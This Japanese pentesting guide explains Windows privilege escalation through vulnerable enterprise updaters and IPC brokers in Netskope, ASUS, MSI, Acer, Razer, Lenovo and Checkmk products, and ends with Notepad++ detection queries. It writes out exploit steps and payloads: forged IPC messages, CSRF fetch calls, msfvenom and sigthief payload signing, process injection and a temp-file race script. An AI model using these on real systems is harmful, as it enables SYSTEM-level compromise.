# Enterprise Auto-Updater と特権 IPC の悪用（例: Netskope、ASUS、MSI）

{{#include ../../banners/hacktricks-training.md}}

このページでは、低摩擦な IPC サーフェスと特権的な更新フローを公開している、エンタープライズ向けエンドポイントエージェントやアップデーターで見つかった、Windows ローカル権限昇格チェーンの一種を一般化します。代表例は Netskope Client for Windows < R129（CVE-2025-0309）です。低権限ユーザーが登録処理を攻撃者が管理するサーバーに誘導し、悪意のある MSI を送り込むことで、SYSTEM サービスにインストールさせることができます。<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>

類似製品に応用できる主な考え方:
- 特権サービスの localhost IPC を悪用し、攻撃者のサーバーへの再登録や再設定を強制する。
- ベンダーの更新エンドポイントを実装し、不正な Trusted Root CA を配布して、アップデーターに悪意のある「署名済み」パッケージを指定する。
- 弱い署名者チェック（CN の許可リスト）、任意のダイジェストフラグ、緩い MSI プロパティを回避する。
- IPC が「暗号化」されている場合、レジストリに保存された、誰でも読み取り可能なマシン識別子から鍵/IV を導出する。
- サービスが実行ファイルのパス/プロセス名で呼び出し元を制限している場合は、許可リストにあるプロセスに inject するか、プロセスを suspend 状態で起動し、最小限のスレッドコンテキストパッチを使って DLL を bootstrap する。

カスタムのローカル TCP サービスは、PIN やその他のアプリケーション認証情報が必要な場合でも、同様に ID と入力境界を確認する必要があります。リスナーとそのプロセスおよび実効サービスアカウントの対応を調べ、実際にデプロイされているバイナリ/バージョンと、呼び出し元が制御するフィールドが固定バッファーにコピーされる前、または子プロセスのコマンド構築に使われる前に長さチェックされるかを確認します。[Microsoft のバッファーオーバーラン対策ガイダンス](https://learn.microsoft.com/en-us/windows/win32/secbp/avoiding-buffer-overruns)では、特権付きネイティブコードで外部入力を未検証のまま扱う危険性が説明されています。loopback リスナー、ハードコードされた認証情報、またはプロセス名だけでは、メモリ破損や SYSTEM での実行が発生するとは限りません。到達可能性、認可、コードパス、緩和策はそれぞれ個別の条件です。通常の列挙では、稼働中のサービスにクラッシュを起こす長さの入力を送らず、受動的な手法を使用してください。

---
## 1) localhost IPC 経由で攻撃者のサーバーへの登録を強制する

多くのエージェントには、JSON を使って localhost TCP 経由で SYSTEM サービスと通信するユーザーモードの UI プロセスが含まれています。

Netskope で確認された構成:
- UI: stAgentUI（低整合性） ↔ Service: stAgentSvc（SYSTEM）
- IPC コマンド ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Exploit の流れ:
1) バックエンドホスト（例: AddonUrl）を制御する claim を含む JWT 登録トークンを作成する。署名が不要になるよう alg=None を使う。
2) JWT とテナント名を指定し、プロビジョニングコマンドを呼び出す IPC メッセージを送信する:

```json
{
  "148": {
    "idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
    "tenantName": "TestOrg"
  }
}
```

3) サービスが登録/設定情報を取得するため、攻撃者が用意したサーバーへのリクエストを開始します。例:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

注意:
- 呼び出し元の検証がパス/名前ベースの場合は、許可リストに登録されたベンダーのバイナリからリクエストを送信します（§4参照）。<sup>[[1]](#references)[[2]](#references)</sup>

### ネットワークに公開された管理用IPC

この信頼境界が常にlocalhostに限定されているとは限りません。報告されているMyReport Updater 2.1.1のケースでは、`LocalSystem`サービスがすべてのインターフェースで待ち受け、認証なしのgRPC設定変更を受け付けていました。変更できる設定は、参照先ホスト、ポート、動作モードでした。リモートから実行するには、リスナーへのネットワークアクセスと、サービスから指定した参照先へのアウトバウンドアクセスの両方が必要でした。これらは、後続のパッケージ処理がファイル書き込み境界を越えられるかどうかとは分けて評価してください。<sup>[[16]](#references)</sup>

---
## 2) update channelを乗っ取り、SYSTEMとしてコードを実行する

クライアントが自分のサーバーに接続したら、想定されるエンドポイントを実装し、攻撃者のMSIを取得するよう誘導します。典型的な手順:

1) /v2/config/org/clientconfig → アップデーターの間隔を非常に短くしたJSON設定を返します。例:
```json
{
  "clientUpdate": { "updateIntervalInMin": 1 },
  "check_msi_digest": false
}
```
2) /config/ca/cert → PEM CA certificate を返す。サービスはこれを Local Machine Trusted Root ストアにインストールする。
3) /v2/checkupdate → 悪意のある MSI と偽のバージョンを指すメタデータを提供する。

実環境でよく見られる一般的なチェックのバイパス:
- Signer CN allow-list: サービスは Subject CN が「netSkope Inc」または「Netskope, Inc.」と一致するかだけを確認している場合がある。rogue CA でその CN を持つ leaf を発行し、MSI に署名できる。
- CERT_DIGEST property: CERT_DIGEST という名前の無害な MSI property を含める。インストール時に検証は行われない。
- Optional digest enforcement: config flag（例: check_msi_digest=false）で、追加の暗号学的検証が無効になる。

結果: SYSTEM サービスが
C:\ProgramData\Netskope\stAgent\data\*.msi
から MSI をインストールし、NT AUTHORITY\SYSTEM として任意のコードを実行する。<sup>[[1]](#references)[[2]](#references)</sup>

パッチバイパスの教訓: ベンダーがアップデート元を暗号学的に認証せず、少数の「信頼できる」ドメインを allow-list に登録するだけの対応をした場合は、依然としてトラフィックを誘導できるベンダー所有の redirector や reverse proxy を探す。Netskope の場合、公開された追加調査により、R129 時代の allow-list は、攻撃者が制御する Azure App Service のコンテンツを proxy する `rproxy.goskope.com` 経由で依然として悪用可能だったことが示された。ホスト名の allow-list は信頼境界ではなく、時間稼ぎと考えること。<sup>[[14]](#references)</sup>

もう一つの失敗パターンは、**整合性はあるが認証されていないパッケージメタデータ**だ。MyReport の事例では、攻撃者が制御する参照先が改変された archive を配信し、中継者がベンダーの MD5 digest と size の応答を updater に届く前に変更した。これらの値の一致で確認できるのは応答の整合性であり、ベンダー由来であることではない。MD5 collision は必要なかった。呼び出し側がインストール先ディレクトリを選択できたため、特権での展開がファイル書き込みの境界になった。その結果生じる DLL-loading primitive については、[arbitrary file write を DLL hijacking に連鎖させる](dll-hijacking/#chaining-an-arbitrary-file-write-into-a-missing-dll-hijack)を参照。<sup>[[16]](#references)</sup>

---
## 3) 暗号化された IPC リクエストの偽造（存在する場合）

R127 以降、Netskope は IPC JSON を Base64 のように見える encryptData field でラップするようになった。リバースエンジニアリングの結果、AES が使われており、key/IV はすべてのユーザーが読み取り可能な registry 値から導出されていた:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

攻撃者は暗号化を再現し、標準ユーザーから有効な暗号化済みコマンドを送信できる。<sup>[[1]](#references)[[2]](#references)</sup> 一般的なヒント: agent が突然 IPC を「暗号化」するようになったら、HKLM 配下の device ID、product GUID、install ID が素材として使われていないか探す。

---
## 4) IPC 呼び出し元の allow-list（path/name checks）のバイパス

一部のサービスは、TCP 接続の PID を解決し、その image path/name を Program Files 配下にある allow-list 登録済みのベンダー製 binary（例: stagentui.exe、bwansvc.exe、epdlp.exe）と比較して、peer を認証しようとする。

実用的なバイパスは2つ:
- allow-list 登録済みの process（例: nsdiag.exe）に DLL injection し、その内部から IPC を proxy する。
- allow-list 登録済みの binary を suspended 状態で起動し、CreateRemoteThread を使わずに proxy DLL を bootstrap して、driver による tamper ルールを満たす（§5 を参照）。<sup>[[1]](#references)[[2]](#references)</sup>

---
## 5) tamper protection と両立する injection: suspended process + NtContinue patch

製品には、保護対象 process の handle から危険な権限を取り除く minifilter/OB callbacks driver（例: Stadrv）が組み込まれていることが多い:
- Process: PROCESS_TERMINATE、PROCESS_CREATE_THREAD、PROCESS_VM_READ、PROCESS_DUP_HANDLE、PROCESS_SUSPEND_RESUME を削除
- Thread: THREAD_GET_CONTEXT、THREAD_QUERY_LIMITED_INFORMATION、THREAD_RESUME、SYNCHRONIZE に制限

これらの制約に対応する、信頼性の高い user-mode loader:
1) CREATE_SUSPENDED を指定してベンダーの binary を CreateProcess する。
2) まだ許可されている handle を取得する: process には PROCESS_VM_WRITE | PROCESS_VM_OPERATION、thread には THREAD_GET_CONTEXT/THREAD_SET_CONTEXT（または既知の RIP に code を patch する場合は THREAD_RESUME のみ）。
3) ntdll!NtContinue（またはその他の早期に必ず map される thunk）を、DLL path を指定して LoadLibraryW を呼び出し、その後に戻る小さな stub で上書きする。
4) ResumeThread を実行して process 内で stub を起動し、DLL をロードする。

すでに保護されている process に対して PROCESS_CREATE_THREAD や PROCESS_SUSPEND_RESUME を使うことなく（自分で作成したため）、driver の policy を満たせる。<sup>[[1]](#references)[[2]](#references)</sup>

---
## 6) 実用的な tooling
- NachoVPN（Netskope plugin）は rogue CA、悪意のある MSI の署名、および必要な endpoint の配信を自動化する: /v2/config/org/clientconfig、/config/ca/cert、/v2/checkupdate。<sup>[[3]](#references)</sup>
- UpSkope は任意の IPC message（AES 暗号化も可能）を作成する custom IPC client で、allow-list 登録済みの binary から送信するための suspended-process injection も含む。<sup>[[4]](#references)</sup>

## 7) 未知の updater/IPC surface の迅速な triage workflow

新しい endpoint agent や motherboard の「helper」suite を調べる場合、簡単な workflow で、有望な privesc target かどうかを通常は判断できる。<sup>[[6]](#references)</sup>

1) loopback listener を列挙し、ベンダーの process と対応付ける:

```powershell
Get-NetTCPConnection -State Listen |
  Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
  Select-Object LocalAddress,LocalPort,OwningProcess,
    @{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```

2) 候補となる名前付きパイプを列挙する:

```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```

3) プラグインベースのIPCサーバーで使用されるレジストリ内のルーティングデータを収集する:

```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
  Select-Object PSChildName
```

4) まずユーザーモードクライアントからエンドポイント名、JSONキー、コマンドIDを抽出します。パッケージ化された Electron/.NET フロントエンドからは、完全なスキーマが頻繁に leak します:

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
  -Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```

5) 最終的にプロセスを起動するコードパスだけでなく、実際の信頼判定条件を探す:

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
  -Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```

優先して調べるべきパターン:
- `WinVerifyTrust` を使わずに `CryptQueryObject` で証明書を解析している場合、「証明書が存在する」ことを「証明書が信頼されている」ことと扱っている可能性があり、証明書の複製や偽の署名者を使った手口が可能になります。
- `Origin`、`Referer`、ダウンロードURL、プロセス名、署名者のCNに対する部分文字列やサフィックスのチェックは、認証にはなりません。`contains(".vendor.com")` は、攻撃者が制御する類似ドメインを使って悪用できることがよくあります。
- 低権限のGUIが「ファイルは信頼できる」と判定し、SYSTEMブローカーがその結果をそのまま使う場合、クライアント側のDLL/JSをパッチするか再実装するだけで、境界を完全に回避できることがあります（Razer型の検証分離）。
- ブローカーがペイロードを `%TEMP%`/`C:\Windows\Temp` にコピーしてから、そのパスで検証またはスケジュールする場合は、すぐにTOCTOUによる置き換えの隙と、より弱いチェックを持つ代替 `ExecuteTask()` ラッパーを公開する同階層のプラグインモジュールを調べてください。<sup>[[6]](#references)</sup>

名前付きパイプを多用するターゲットでは、プロトコルを詳しくリバースする前に弱いDACLや外部から到達可能なパイプを見つける方法として、PipeViewerが手軽です。<sup>[[11]](#references)</sup>

ターゲットが呼び出し元の認証にPID、イメージパス、またはプロセス名しか使っていない場合、それらは境界ではなく、少し手間が増える程度のものと考えてください。正規クライアントへのインジェクションや、許可リストにあるプロセスからの接続だけで、サーバーのチェックを通過できることがよくあります。名前付きパイプについては、[クライアントの偽装とパイプの悪用に関するこのページ](named-pipe-client-impersonation.md)で、プリミティブを詳しく解説しています。

特権を持つ**クリーンアップまたは復元ブローカー**では、パイプACLだけでなく、パスの信頼境界も調べてください。サービス実行ファイルとインストールディレクトリが保護されていても、低権限の呼び出し元が共有ディレクトリ内の復元先を指定したり、ステージング済みバックアップアーティファクトの名前を変更したりできる場合があります。呼び出し元が復元コマンドにアクセスできること、正確なステージング済み入力またはファイル名を変更できること、ブローカーがより高い権限で実行されること、復元処理が実際に選択された保護対象パスへ書き込むことを、それぞれ個別に確認してください。書き込み可能なステージングディレクトリや読み取り可能なパイプだけでは、任意の特権書き込みが可能とは言えません。宛先のマッピングとサービスの動作を、コードレビューまたは管理されたテストで確認する必要があります。ユーザーファイルが削除される可能性があるため、受動的な列挙中に未知のクリーンアップコマンドを実行しないでください。

---
## 8) ベンダー署名だけで認証されるモジュラーアドインブローカー（Lenovo Vantageのパターン）

新たに注目すべき手法として、**署名済みクライアントRPCブローカー**があります。低権限のLenovo署名済みデスクトッププロセスがSYSTEMサービスと通信し、そのサービスが `%ProgramData%` 以下のXML記述アドインにJSONコマンドを振り分けます。受け入れられる署名済みクライアントのどれかでコード実行を達成できると、すべての `runas="system"` コントラクトが攻撃対象になります。<sup>[[15]](#references)</sup>

Lenovo Vantageの調査で確認された、価値の高いプリミティブ:
- **呼び出し元がベンダー署名済みであることを理由に信頼する**: 研究者は、Lenovo署名済みEXEを書き込み可能なディレクトリにコピーし、DLLサイドロード（`profapi.dll`）を成立させて任意コードを実行することで、サービスがすでに信頼しているクライアント内の認証済みコンテキストに到達しました。
- **マニフェストを利用した攻撃対象領域の特定**: アドインは `C:\ProgramData\Lenovo\Vantage\Addins\*.xml` 以下で宣言されています。複数のコントラクトが `SYSTEM` として実行されるため、これらのマニフェストを列挙すると、ブローカー自体をリバースするよりも早く、実際の特権操作が判明することがよくあります。
- **認証済みチャネルの背後にあるコマンドごとの脆弱性**: 信頼済みクライアント内に入った後の公開調査では、更新/インストール操作におけるパストラバーサルと競合状態、特権設定データベースに対するraw SQLの悪用、意図されたハイブ外への書き込みを可能にする部分文字列ベースのレジストリパスチェックが見つかりました。

ターゲットで役立つ偵察:

```powershell
Get-ChildItem "$env:ProgramData\Lenovo\Vantage\Addins" -Filter *.xml |
  Select-String -Pattern 'runas="system"|<name>|<namespace>'
```

```powershell
Select-String -Path 'C:\Program Files\Lenovo\**\*.dll','C:\Program Files\Lenovo\**\*.exe' `
  -Pattern 'contract|command|payload|DeleteTable|DeleteSetting|Set-KeyChildren|DownloadAndInstallAppComponent|InstallOnly'
```

Practical takeaway: helper suite が、まず **caller process** を認証してから数十個の plugin/add-in command に振り分ける broker を公開している場合、入口の trust check を bypass しただけで調査を終えてはいけません。manifest/contract table をダンプし、各 high-privilege verb を個別に fuzz してください。認証済み channel の裏には、通常、複数の second-stage bug が隠れています。

---
## 1) 特権 HTTP API に対する browser-to-localhost CSRF（ASUS DriverHub）

DriverHub は、127.0.0.1:53000 で動作する user-mode HTTP service（ADU.exe）を提供しています。この service は、https://driverhub.asus.com からの browser call を想定しています。Origin filter は、Origin header と `/asus/v1.0/*` が公開する download URL に対して、単純に `string_contains(".asus.com")` を実行します。そのため、`https://driverhub.asus.com.attacker.tld` のような攻撃者が制御する host も check を通過し、JavaScript から状態を変更する request を送信できます。<sup>[[6]](#references)</sup> その他の bypass パターンについては、[CSRF の基本](../../pentesting-web/csrf-cross-site-request-forgery.md)を参照してください。

実践的な手順:
1) `.asus.com` を含む domain を登録し、そこに悪意のある webpage をホストします。
2) `fetch` または XHR を使って、`http://127.0.0.1:53000` 上の特権 endpoint（例: `Reboot`、`UpdateApp`）を呼び出します。
3) handler が想定する JSON body を送信します。packed frontend JS に、以下の schema が示されています。

```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```

以下に示す PowerShell CLI でさえ、Origin ヘッダーを信頼された値に偽装すると成功します：

```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
  -Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
  -Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```

攻撃者のサイトにブラウザーでアクセスすると、1クリック（または `onload` による0クリック）でローカル CSRF が発生し、SYSTEM 権限のヘルパーを操作できます。

---
## 2) 安全でないコード署名の検証と証明書のクローン作成（ASUS UpdateApp）

`/asus/v1.0/UpdateApp` は、JSON body で指定された任意の実行ファイルをダウンロードし、`C:\ProgramData\ASUS\AsusDriverHub\SupportTemp` にキャッシュします。ダウンロード URL の検証では同じ部分文字列ロジックを再利用しているため、`http://updates.asus.com.attacker.tld:8000/payload.exe` も受け入れられます。ダウンロード後、ADU.exe は PE に署名が含まれていることと、Subject 文字列が ASUS と一致することを確認するだけで実行します。`WinVerifyTrust` も証明書チェーンの検証も行いません。

この処理を悪用するには:
1) payload を作成します（例: `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`）。
2) ASUS の署名者をコピーして payload に付与します（例: `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`）。
3) `pwn.exe` を `.asus.com` に似せたドメインでホストし、上記のブラウザー CSRF で UpdateApp を実行します。

Origin と URL のフィルターはいずれも部分文字列ベースで、署名者の確認も文字列を比較するだけなので、DriverHub は攻撃者のバイナリを取得し、昇格された権限で実行します。<sup>[[6]](#references)</sup>

---
## 1) updater のコピー/実行パスにおける TOCTOU（MSI Center CMD_AutoUpdateSDK）

MSI Center の SYSTEM サービスは、各フレームが `4-byte ComponentID || 8-byte CommandID || ASCII arguments` で構成される TCP プロトコルを公開しています。コアコンポーネント（Component ID `0f 27 00 00`）には `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}` が含まれています。そのハンドラーは:
1) 指定された実行ファイルを `C:\Windows\Temp\MSI Center SDK.exe` にコピーします。
2) `CS_CommonAPI.EX_CA::Verify` で署名を検証します（証明書の subject が “MICRO-STAR INTERNATIONAL CO., LTD.” と一致し、`WinVerifyTrust` が成功する必要があります）。
3) 一時ファイルを SYSTEM として実行するスケジュールタスクを、攻撃者が指定した引数で作成します。

検証から `ExecuteTask()` まで、コピーされたファイルはロックされません。攻撃者は次の操作ができます:
- 正規の MSI 署名付きバイナリを指定する Frame A を送信します（署名検証を確実に通過させ、タスクをキューに登録します）。
- 検証完了直後に `MSI Center SDK.exe` を悪意ある payload で上書きする Frame B メッセージを、繰り返し送信して race を仕掛けます。

スケジューラーがタスクを実行すると、元のファイルを検証済みであるにもかかわらず、上書きされた payload が SYSTEM として実行されます。確実に悪用するには、TOCTOU の隙を突くまで CMD_AutoUpdateSDK を連続送信する goroutine/thread を2つ使用します。<sup>[[6]](#references)</sup>

---
## 2) カスタム SYSTEM レベル IPC と偽装の悪用（MSI Center + Acer Control Centre）

### MSI Center TCP コマンドセット
- `MSI.CentralServer.exe` がロードする各プラグイン/DLL には、`HKLM\SOFTWARE\MSI\MSI_CentralServer` に保存された Component ID が割り当てられます。フレームの最初の4バイトでコンポーネントを選択できるため、攻撃者は任意のモジュールにコマンドをルーティングできます。
- プラグインは独自のタスクランナーを定義できます。`Support\API_Support.dll` は `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` を公開し、**署名検証を行わずに** `API_Support.EX_Task::ExecuteTask()` を直接呼び出します。任意のローカルユーザーが `C:\Users\<user>\Desktop\payload.exe` を指定すれば、確実に SYSTEM として実行できます。
- Wireshark で loopback をスニッフィングするか、dnSpy で .NET バイナリを解析すれば、Component とコマンドの対応関係をすぐに特定できます。その後、カスタム Go/Python クライアントでフレームを再送できます。<sup>[[6]](#references)</sup>

### Acer Control Centre の named pipe と偽装レベル
- SYSTEM 権限の `ACCSvc.exe` は `\\.\pipe\treadstone_service_LightMode` を公開しており、その discretionary ACL はリモートクライアント（例: `\\TARGET\pipe\treadstone_service_LightMode`）からのアクセスを許可します。ファイルパスとともに command ID `7` を送信すると、サービスのプロセス起動ルーチンが呼び出されます。
- クライアントライブラリは引数とともに終端を示すマジックバイト（113）をシリアライズします。Frida/`TsDotNetLib` を使った動的解析（計装のヒントは [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) を参照）から、ネイティブハンドラーがこの値を `SECURITY_IMPERSONATION_LEVEL` と integrity SID に対応付けた後、`CreateProcessAsUser` を呼び出すことが分かります。
- 113（`0x71`）を114（`0x72`）に置き換えると、完全な SYSTEM token を維持し、high-integrity SID（`S-1-16-12288`）を設定する汎用分岐に入ります。そのため、起動されたバイナリはローカルでもマシン間でも、制限のない SYSTEM として実行されます。
- 公開されているインストーラーフラグ（`Setup.exe -nocheck`）と組み合わせれば、ラボ VM に ACC をインストールし、ベンダーのハードウェアなしで pipe をテストできます。<sup>[[6]](#references)</sup>

これらの IPC の脆弱性は、localhost のサービスで相互認証（ALPC SID、`ImpersonationLevel=Impersonation` フィルター、token filtering）を強制すべき理由と、任意のバイナリを実行する各モジュールのヘルパーで、同じ署名検証を行うべき理由を示しています。

---
## 3) 脆弱な user-mode 検証に依存する COM/IPC「elevator」ヘルパー（Razer Synapse 4）

Razer Synapse 4 では、この種の攻撃に使える新たなパターンが加わりました。低権限ユーザーが COM ヘルパーにプロセスの起動を要求でき、その要求は `RzUtility.Elevator` を通じて処理されます。一方、信頼性の判断は、特権境界内で堅牢に行われるのではなく、user-mode DLL（`simple_service.dll`）に委ねられています。

確認された悪用手順:
- COM オブジェクト `RzUtility.Elevator` をインスタンス化します。
- `LaunchProcessNoWait(<path>, "", 1)` を呼び出して、昇格したプロセスの起動を要求します。
- 公開 PoC では、要求を送信する前に `simple_service.dll` 内の PE 署名チェックをパッチで無効化し、攻撃者が選んだ任意の実行ファイルを起動できるようにします。<sup>[[6]](#references)[[10]](#references)</sup>

最小限の PowerShell 呼び出し:

```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```

一般的な教訓:「helper」スイートをリバースする際は、localhost TCPやnamed pipesだけで調査を止めないこと。`Elevator`、`Launcher`、`Updater`、`Utility`などの名前を持つCOMクラスを確認し、特権サービスが対象バイナリ自体を検証しているのか、それともパッチ可能なユーザーモードのクライアントDLLが算出した結果を単に信頼しているのかを確かめること。このパターンはRazerに限らず、低権限側から渡された許可／拒否の判断を高権限のブローカーが使用する分離設計であれば、privescの攻撃対象となる可能性がある。


---
## MSI修復中の予測可能な一時スクリプト実行（Checkmk Agent / CVE-2024-0670）

一部のWindowsエージェントでは、今も特権操作を実装するために、一時的な`.cmd`を`C:\Windows\Temp`に書き込み、`SYSTEM`として実行しています。ファイル名が予測可能で、サービスが既存ファイルを安全に再作成しない場合、低権限ユーザーは、これから作成される一時ファイルをあらかじめ**読み取り専用**で作成し、特権プロセスに自前のスクリプトではなく攻撃者が制御する内容を実行させることができます。

脆弱なCheckmk Agentビルドで確認された内容:
- 一時ファイルのパターン: `cmk_all_<PID>_1.cmd`
- 影響を受けるブランチ: `2.0.0`、`2.1.0`、`2.2.0`
- トリガー: キャッシュされたエージェントパッケージのMSI **修復**<sup>[[8]](#references)[[9]](#references)</sup>

実践的な手順:
1. 現在のプロセスIDまたは実行中のエージェントのPIDから、現実的なPIDの範囲を推定する。
2. 短い**ASCII**の`.cmd`ペイロードを作成する（`Set-Content -Encoding Ascii`または`cmd.exe`のリダイレクトを使用する。バッチファイルにUTF-16で出力するPowerShellは避ける）。
3. 候補範囲内の各PIDについて、`C:\Windows\Temp\cmk_all_<PID>_1.cmd`を配置し、各ファイルを読み取り専用に設定する。
4. キャッシュされたMSIの修復を実行し、特権サービスに一時スクリプトを再生成させた後、そのスクリプトを実行させる。<sup>[[7]](#references)</sup>

```powershell
Set-Content -Path C:\ProgramData\payload.cmd -Encoding Ascii -Value "@echo off`nwhoami > C:\ProgramData\proof.txt"
1..10000 | ForEach-Object {
  Copy-Item C:\ProgramData\payload.cmd "C:\Windows\Temp\cmk_all_${_}_1.cmd"
  Set-ItemProperty "C:\Windows\Temp\cmk_all_${_}_1.cmd" -Name IsReadOnly -Value $true
}
```

脆弱な製品が Windows Installer でインストールされている場合、修復を実行する前に、C:\Windows\Installer 内のランダムに見えるキャッシュ済み MSI を製品名に対応付けます:<sup>[[7]](#references)</sup>

```powershell
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties" |
  ForEach-Object {
    $p = Get-ItemProperty $_.PSPath
    [PSCustomObject]@{Name=$p.DisplayName; Pkg=$p.LocalPackage}
  } | Where-Object Name -like "*Check MK Agent*"

msiexec /fa C:\Windows\Installer\<cached-agent>.msi
```

運用上の注意:
- `msiexec /fa` が非対話型の WinRM シェルから失敗する場合、`qwinsta` を使うと、既存のデスクトップセッションまたは切断されたセッションから修復を正しく起動できるかどうかを確認できます。<sup>[[7]](#references)</sup>
- このパターンは、**一時スクリプトを全ユーザーが書き込み可能な場所にステージし、後で SYSTEM として実行する**他のエンドポイントエージェントやupdaterにも当てはまります。予測可能な名前、排他的な作成セマンティクスの欠如、オンデマンドで起動できる修復／更新フローがないかテストしてください。

### 対話型インストーラーの修復と特権コンソール

PDF24 Creator 11.15.1 は、別種の MSI 修復リスクを示しています。修復中に、プリンターインストールのカスタムアクションが SYSTEM 権限で可視コンソールを起動する場合があります。この動作に対処するため、ベンダーは 11.15.2 で MSI インストーラーを変更しました。古い製品バージョンは、あくまでトリアージの手掛かりです。登録済みまたはアクセス可能な MSI パッケージがあるか、このユーザーが修復を開始できるか、脆弱なカスタムアクションとログファイルの遅延が存在するか、対話型デスクトップでコンソールが表示されるかを確認してください。報告された遅延には `faxPrnInst.log` に対する oplock が使われていました。通常のファイル書き込み権限だけがアクセス条件ではありません。非対話型シェル、アクセスできないパッケージ、またはパッチ済みインストーラーによって、この攻撃チェーンが成立しないことがあります。この問題は `AlwaysInstallElevated` に依存せず、予測可能な一時スクリプトの置き換えとも異なります。

---
## 脆弱なupdater検証を介したリモートサプライチェーン乗っ取り（WinGUp / Notepad++）

2025年6月から2025年12月にかけて、Notepad++ の更新フローを支えるホスティングインフラを侵害した攻撃者は、標的となる被害者に悪意のあるマニフェストを選択的に配信しました。古い WinGUp ベースのupdaterは更新の真正性を十分に検証していなかったため、悪意のある XML レスポンスによって、クライアントを攻撃者が制御する URL にリダイレクトできました。クライアントは、信頼できる証明書チェーンとダウンロードしたインストーラーの有効な PE 署名の両方を必須にせず、HTTPS コンテンツを受け入れていたため、被害者はトロイの木馬化された NSIS `update.exe` をダウンロードして実行しました。<sup>[[12]](#references)[[13]](#references)</sup>

運用フロー（ローカルでのexploitは不要）:
1. **インフラの傍受**: CDN／ホスティングを侵害し、攻撃者のメタデータを含む更新チェックへの応答を返して、悪意のあるダウンロード URL を指定する。
2. **トロイの木馬化された NSIS**: インストーラーがpayloadを取得／実行し、2つの実行チェーンを悪用する:
   - **署名済みバイナリの持ち込み + sideload**: 署名済みの Bitdefender `BluetoothService.exe` を同梱し、検索パスに悪意のある `log.dll` を配置する。署名済みバイナリが実行されると、Windows が `log.dll` を sideload し、これが復号して Chrysalis backdoor をリフレクティブにロードする（静的検知を妨げるため、Warbird による保護と API hashing を使用）。
   - **スクリプトによるshellcode injection**: NSIS がコンパイル済み Lua スクリプトを実行し、Win32 API（例: `EnumWindowStationsW`）を使ってshellcodeを注入し、Cobalt Strike Beaconをステージする。<sup>[[12]](#references)</sup>

あらゆる自動更新機能に対するhardening／検知の要点:
- ダウンロードしたインストーラーの**証明書と署名の検証**を必須にする（ベンダー署名者を固定し、CN／チェーンが一致しない場合は拒否する）。更新マニフェスト自体にも署名する（例: XMLDSig）。検証されていない限り、マニフェストで指定されたリダイレクトをブロックする。
- **BYO 署名済みバイナリの sideload**をダウンロード後の検知ポイントとして扱う。署名済みベンダー EXE が正規のインストールパス外にある DLL 名をロードした場合（例: Bitdefender が Temp／Downloads から `log.dll` をロードする）、またupdaterがベンダー署名のないインストーラーを一時領域に配置／実行した場合にアラートを出す。
- この攻撃チェーンで確認された**マルウェア固有の痕跡**を監視する（汎用的な検知ポイントとして有用）: mutex `Global\Jdhfv_1.0.1`、`%TEMP%` への不審な `gup.exe` の書き込み、Lua によるshellcode injectionのステージ。
- Notepad++ は v8.8.9 以降で WinGUp を強化しました。返される XML には XMLDSig で署名されるようになり、新しいビルドでは、通信経路だけを信頼せず、ダウンロードしたインストーラーの証明書と署名を検証するようになりました。<sup>[[13]](#references)</sup>

<details>
<summary>Cortex XDR XQL – Bitdefender署名済みEXEによる <code>log.dll</code> の sideload（T1574.001）</summary>

```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```

</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code>がNotepad++以外のインストーラーを起動</summary>

```sql
config case_sensitive = false
| dataset = xdr_data
